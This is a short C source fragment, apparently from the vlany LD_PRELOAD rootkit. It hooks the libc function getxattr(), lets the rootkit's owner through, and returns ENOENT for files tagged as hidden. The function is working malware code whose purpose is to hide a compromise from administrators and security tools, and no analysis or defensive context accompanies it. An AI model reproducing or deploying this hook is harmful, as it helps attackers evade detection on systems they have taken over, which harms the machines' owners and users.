ssize_t getxattr(const char *path, const char *name, void *value, size_t size)
{
    #ifdef DEBUG
        printf("[vlany] getxattr() called\n");
    #endif

    HOOK(old_getxattr, CGETXATTR);

    if(owned()) return old_getxattr(path, name, value, size);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_getxattr(path, name, value, size);
}
